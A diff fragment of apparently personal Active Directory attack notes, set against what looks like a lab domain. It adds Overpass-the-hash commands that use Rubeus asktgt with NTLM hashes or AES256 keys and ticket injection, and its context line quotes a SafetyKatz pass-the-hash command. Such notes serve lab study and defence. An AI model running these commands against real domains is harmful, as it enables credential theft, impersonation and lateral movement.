@@ -486,4 +486,22 @@ $ SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /a
 
 
 - Over Pass the hash (OPTH) generate tokens from hashes or keys.
-- Below doesn't need el
+
+- Below doesn't need elevation (Will overwrite current TGT)
+
+
+```powershell
+$ Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
+```
+
+
+- Below command needs elevation.
+
+
+```powershell
+$ Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+
+
+
